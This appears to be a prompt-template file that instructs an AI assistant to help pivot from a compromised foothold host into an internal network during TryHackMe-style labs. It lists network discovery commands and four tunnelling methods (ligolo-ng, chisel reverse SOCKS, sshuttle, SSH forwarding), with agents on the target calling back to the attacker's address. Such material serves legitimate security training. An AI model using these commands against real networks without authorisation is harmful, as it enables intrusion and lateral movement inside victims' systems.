---
description: Pivot / tunnel into an internal network through a compromised host
---

Help me pivot through the foothold host to reach an internal network/host.
Args (optional): $ARGUMENTS  (e.g. the internal subnet or target you're trying to reach)

Show my tun0 IP as the attacker address. Pick the technique that fits what's on the box.

## First: discover the internal network from the foothold
- `ip a` / `ifconfig` / `arp -a` — find a second NIC or internal subnet
- `ip route` — see what networks the host can reach
- Ping-sweep or check for live internal hosts (careful, stay in scope)

## Option A — ligolo-ng (best all-round, needs a tun interface)
1. On Kali: set up the tun, start the proxy:
   `sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up`
   `./proxy -selfcert`
2. Upload the matching `agent` to the target, run it pointing back:
   `agent -connect <tun0>:11601 -ignore-cert`
3. In the ligolo console: `session`, then add the internal route on Kali:
   `sudo ip route add <internal-subnet> dev ligolo`
4. Now reach internal hosts directly from Kali.

## Option B — chisel (simple SOCKS proxy, very common on THM)
- Kali (server): `./chisel server -p 8000 --reverse`
- Target (client): `./chisel client <tun0>:8000 R:socks`
- Then use `proxychains <tool> <internal-ip>` (set socks5 127.0.0.1:1080 in /etc/proxychains4.conf)

## Option C — sshuttle (if you have SSH creds on the pivot — cleanest)
- `sshuttle -r <user>@<pivot-ip> <internal-subnet> --ssh-cmd "ssh -i key"`

## Option D — SSH port forwarding (single-port, no extra tools)
- Local forward: `ssh -L 8080:<internal-ip>:80 <user>@<pivot>`
- Dynamic (SOCKS): `ssh -D 1080 <user>@<pivot>` + proxychains

## After the tunnel is up
Re-run recon against the internal target THROUGH the proxy (proxychains nmap is slow —
prefer -sT -Pn and a small port list). Record the internal host in notes.md as a new
target and continue the normal methodology against it. Stay strictly in the room's scope.
